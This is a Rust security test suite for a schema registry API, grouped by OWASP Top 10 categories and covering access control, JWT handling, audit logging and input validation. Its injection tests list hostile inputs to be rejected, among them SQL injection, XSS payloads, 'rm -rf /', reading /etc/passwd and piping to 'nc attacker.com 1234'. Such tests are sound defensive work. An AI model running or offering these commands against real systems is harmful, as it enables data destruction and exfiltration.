//! Comprehensive Security Test Suite
//!
//! Tests for OWASP Top 10 vulnerabilities and security best practices

use llm_schema_api::validation::*;
use schema_registry_security::*;

#[cfg(test)]
mod owasp_top_10_tests {
    use super::*;

    // =========================================================================
    // A01:2021 – Broken Access Control
    // =========================================================================

    #[tokio::test]
    async fn test_authorization_enforcement() {
        use llm_schema_api::auth::{AuthPrincipal, Permission};
        use std::collections::HashSet;

        // User with read-only permissions
        let readonly_user = AuthPrincipal {
            user_id: "readonly_user".to_string(),
            email: Some("readonly@example.com".to_string()),
            roles: vec!["reader".to_string()],
            permissions: HashSet::from([Permission::SchemaRead]),
            metadata: std::collections::HashMap::new(),
        };

        // Should have read permission
        assert!(readonly_user.has_permission(&Permission::SchemaRead));

        // Should NOT have write permission
        assert!(!readonly_user.has_permission(&Permission::SchemaWrite));

        // Admin user
        let admin_user = AuthPrincipal {
            user_id: "admin_user".to_string(),
            email: Some("admin@example.com".to_string()),
            roles: vec!["admin".to_string()],
            permissions: HashSet::from([
                Permission::SchemaRead,
                Permission::SchemaWrite,
                Permission::SchemaDelete,
                Permission::AdminAccess,
            ]),
            metadata: std::collections::HashMap::new(),
        };

        // Admin should have all permissions
        assert!(admin_user.has_permission(&Permission::SchemaWrite));
        assert!(admin_user.has_permission(&Permission::AdminAccess));
    }

    // =========================================================================
    // A02:2021 – Cryptographic Failures
    // =========================================================================

    #[tokio::test]
    async fn test_jwt_token_security() {
        let revocation_list = std::sync::Arc::new(TokenRevocationList::new());
        let jwt_manager = JwtManager::new_hs256(
            b"test-secret-key-minimum-32-bytes-long",
            revocation_list,
        );

        let claims = TokenClaims::new_access_token(
            "user123".to_string(),
            Some("user@example.com".to_string()),
            vec!["developer".to_string()],
            vec!["schema:read".to_string()],
        );

        // Generate token
        let token = jwt_manager.generate_token(&claims).unwrap();

        // Verify token
        let verified = jwt_manager.verify_token(&token).await.unwrap();
        assert_eq!(verified.sub, "user123");

        // Tampered token should fail
        let mut tampered_token = token.clone();
        tampered_token.push_str("tampered");
        assert!(jwt_manager.verify_token(&tampered_token).await.is_err());
    }

    #[tokio::test]
    async fn test_secrets_rotation() {
        use secrets::{
            InMemorySecretsBackend, RotationConfig, RotationPolicy, Secret,
            SecretMetadata, SecretType, SecretsManager,
        };
        use std::sync::Arc;

        let backend = Arc::new(InMemorySecretsBackend::new());
        let config = RotationConfig {
            max_age_days: 90,
            auto_rotate: true,
            check_interval_hours: 24,
        };
        let manager = SecretsManager::new(backend, config);

        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();

        let secret = Secret {
            metadata: SecretMetadata {
                id: uuid::Uuid::new_v4().to_string(),
                name: "api-key".to_string(),
                version: 1,
                created_at: now,
                expires_at: now + 3600,
                rotated_at: None,
                rotation_policy: RotationPolicy::Periodic { days: 90 },
                tags: std::collections::HashMap::new(),
            },
            secret_type: SecretType::ApiKey {
                key: "old-key".to_string(),
                scope: vec!["read".to_string()],
            },
        };

        manager.store_secret(secret).await.unwrap();

        // Rotate secret
        let rotated = manager.rotate_secret("api-key").await.unwrap();
        assert_eq!(rotated.metadata.version, 2);
    }

    // =========================================================================
    // A03:2021 – Injection
    // =========================================================================

    #[test]
    fn test_sql_injection_prevention() {
        // SQL injection attempts should be blocked
        assert!(validate_subject("user'; DROP TABLE schemas; --").is_err());
        assert!(validate_subject("admin' OR '1'='1").is_err());
        assert!(validate_subject("user UNION SELECT * FROM users").is_err());

        // Valid subjects should pass
        assert!(validate_subject("com.example.user").is_ok());
        assert!(validate_subject("my-schema").is_ok());
    }

    #[test]
    fn test_xss_prevention() {
        // XSS attempts should be blocked
        assert!(validate_description("<script>alert('xss')</script>").is_err());
        assert!(validate_description("javascript:alert(1)").is_err());
        assert!(validate_description("<iframe src='evil.com'>").is_err());
        assert!(validate_description("onclick=alert(1)").is_err());

        // Valid descriptions should pass
        assert!(validate_description("Normal description").is_ok());
        assert!(validate_description("Schema for user events").is_ok());
    }

    #[test]
    fn test_command_injection_prevention() {
        // Command injection attempts should be blocked
        assert!(validate_subject("schema; rm -rf /").is_err());
        assert!(validate_subject("schema && cat /etc/passwd").is_err());
        assert!(validate_subject("schema | nc attacker.com 1234").is_err());
    }

    // =========================================================================
    // A04:2021 – Insecure Design
    // =========================================================================

    #[tokio::test]
    async fn test_rate_limiting_design() {
        // Rate limiting configuration
        let config = RateLimitConfig::default();

        assert_eq!(config.requests_per_minute_ip, 60);
        assert_eq!(config.requests_per_minute_user, 120);
        assert_eq!(config.requests_per_hour_ip, 1000);
    }

    // =========================================================================
    // A05:2021 – Security Misconfiguration
    // =========================================================================

    #[test]
    fn test_secure_defaults() {
        // Ensure secure defaults are in place
        let config = RateLimitConfig::default();
        assert!(config.requests_per_minute_ip > 0);
        assert!(config.requests_per_hour_ip > 0);

        // Schema size limits
        assert_eq!(MAX_SCHEMA_SIZE, 1_048_576); // 1MB
        assert_eq!(MAX_SUBJECT_LENGTH, 255);
    }

    // =========================================================================
    // A06:2021 – Vulnerable and Outdated Components
    // =========================================================================

    #[test]
    fn test_dependency_versions() {
        // This test ensures we're aware of dependency security
        // In production, run cargo-audit in CI/CD
        println!("Run 'cargo audit' to check for vulnerable dependencies");
    }

    // =========================================================================
    // A07:2021 – Identification and Authentication Failures
    // =========================================================================

    #[tokio::test]
    async fn test_authentication_failures_logged() {
        let logger = AuditLogger::new();

        audit::log_auth_failure(
            &logger,
            "attacker".to_string(),
            Some("192.168.1.100".to_string()),
            "Invalid credentials".to_string(),
        )
        .await;

        let count = logger.count().await;
        assert_eq!(count, 1);

        let events = logger
            .get_events(audit::AuditEventFilter {
                event_types: Some(vec![AuditEventType::AuthenticationFailure]),
                ..Default::default()
            })
            .await;

        assert_eq!(events.len(), 1);
        assert_eq!(events[0].event_type, AuditEventType::AuthenticationFailure);
    }

    #[tokio::test]
    async fn test_token_expiration() {
        use std::time::{Duration, SystemTime, UNIX_EPOCH};

        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();

        let mut claims = TokenClaims::new_access_token(
            "user123".to_string(),
            None,
            vec![],
            vec![],
        );

        // Make token expired
        claims.exp = now - 3600;

        assert!(claims.is_expired());
    }

    // =========================================================================
    // A08:2021 – Software and Data Integrity Failures
    // =========================================================================

    #[tokio::test]
    async fn test_audit_log_integrity() {
        let logger = AuditLogger::new();

        // Log multiple events
        for i in 0..10 {
            audit::log_auth_success(
                &logger,
                format!("user{}", i),
                Some(format!("user{}@example.com", i)),
                Some("192.168.1.1".to_string()),
            )
            .await;
        }

        // Verify chain integrity
        assert!(logger.verify_chain_integrity().await);
    }

    #[test]
    fn test_event_hash_verification() {
        let event = AuditEvent::new(
            AuditEventType::SchemaRegistered,
            "Register schema".to_string(),
            AuditResult::Success,
            "genesis".to_string(),
        );

        // Event hash should be valid
        assert!(event.verify_hash());

        // Create tampered event
        let mut tampered = event.clone();
        tampered.action = "Malicious action".to_string();

        // Tampered event should fail verification
        assert!(!tampered.verify_hash());
    }

    // =========================================================================
    // A09:2021 – Security Logging and Monitoring Failures
    // =========================================================================

    #[tokio::test]
    async fn test_security_events_logged() {
        let logger = AuditLogger::new();

        // Log various security events
        audit::log_auth_success(
            &logger,
            "user1".to_string(),
            None,
            Some("192.168.1.1".to_string()),
        )
        .await;

        audit::log_auth_failure(
            &logger,
            "attacker".to_string(),
            Some("10.0.0.1".to_string()),
            "Brute force attempt".to_string(),
        )
        .await;

        audit::log_schema_registered(
            &logger,
            "user1".to_string(),
            "schema-123".to_string(),
            "com.example.user".to_string(),
        )
        .await;

        let count = logger.count().await;
        assert_eq!(count, 3);

        // Verify we can filter by severity
        let warnings = logger
            .get_events(audit::AuditEventFilter {
                severity: Some(AuditSeverity::Warning),
                ..Default::default()
            })
            .await;

        assert_eq!(warnings.len(), 1);
    }

    // =========================================================================
    // A10:2021 – Server-Side Request Forgery (SSRF)
    // =========================================================================

    #[test]
    fn test_path_traversal_prevention() {
        // Path traversal attempts should be blocked
        assert!(validate_subject("../../../etc/passwd").is_err());
        assert!(validate_subject("..\\..\\windows\\system32").is_err());
        assert!(validate_subject("%2e%2e%2fetc%2fpasswd").is_err());

        // Valid paths should pass
        assert!(validate_subject("com.example.schema").is_ok());
    }
}

// =============================================================================
// Additional Security Tests
// =============================================================================

#[cfg(test)]
mod additional_security_tests {
    use super::*;

    #[test]
    fn test_input_size_limits() {
        // Schema too large
        let large_schema = "x".repeat(MAX_SCHEMA_SIZE + 1);
        assert!(validate_schema_size(&large_schema).is_err());

        // Subject too long
        let long_subject = "x".repeat(MAX_SUBJECT_LENGTH + 1);
        assert!(validate_subject(&long_subject).is_err());

        // Too many tags
        let too_many_tags: Vec<String> = (0..MAX_TAGS_COUNT + 1)
            .map(|i| format!("tag{}", i))
            .collect();
        assert!(validate_tags(&too_many_tags).is_err());
    }

    #[test]
    fn test_version_validation() {
        // Valid versions
        assert!(validate_version("1.0.0").is_ok());
        assert!(validate_version("2.1.3-alpha").is_ok());
        assert!(validate_version("1.0.0+build123").is_ok());

        // Invalid versions
        assert!(validate_version("1.0").is_err());
        assert!(validate_version("v1.0.0").is_err());
        assert!(validate_version("1.0.0.0").is_err());
    }

    #[test]
    fn test_json_validation() {
        // Valid JSON
        assert!(validate_json_schema(r#"{"type":"object"}"#).is_ok());

        // Invalid JSON
        assert!(validate_json_schema("{invalid json}").is_err());
        assert!(validate_json_schema("").is_err());
    }

    #[test]
    fn test_sanitization() {
        assert_eq!(sanitize_string("hello<script>"), "helloscript");
        assert_eq!(sanitize_string("user@email.com"), "useremail.com");
        assert_eq!(sanitize_string("normal-name_123"), "normal-name_123");
    }

    #[tokio::test]
    async fn test_token_revocation() {
        use std::sync::Arc;

        let revocation_list = Arc::new(TokenRevocationList::new());
        let jwt_manager = JwtManager::new_hs256(
            b"test-secret-key-minimum-32-bytes-long",
            revocation_list,
        );

        let claims = TokenClaims::new_access_token(
            "user123".to_string(),
            None,
            vec![],
            vec![],
        );

        let token = jwt_manager.generate_token(&claims).unwrap();

        // Token should be valid initially
        assert!(jwt_manager.verify_token(&token).await.is_ok());

        // Revoke token
        jwt_manager.revoke_token(&token).await.unwrap();

        // Token should now be invalid
        assert!(jwt_manager.verify_token(&token).await.is_err());
    }

    #[tokio::test]
    async fn test_correlation_id_tracking() {
        let logger = AuditLogger::new();

        let correlation_id = uuid::Uuid::new_v4().to_string();

        let event = AuditEvent::new(
            AuditEventType::SchemaRegistered,
            "Register schema".to_string(),
            AuditResult::Success,
            String::new(),
        )
        .with_user("user123".to_string(), Some("user@example.com".to_string()))
        .with_request_context(
            Some("192.168.1.1".to_string()),
            Some("Mozilla/5.0".to_string()),
            Some(correlation_id.clone()),
        );

        logger.log(event).await;

        let events = logger.get_events(Default::default()).await;
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].correlation_id, Some(correlation_id));
    }
}
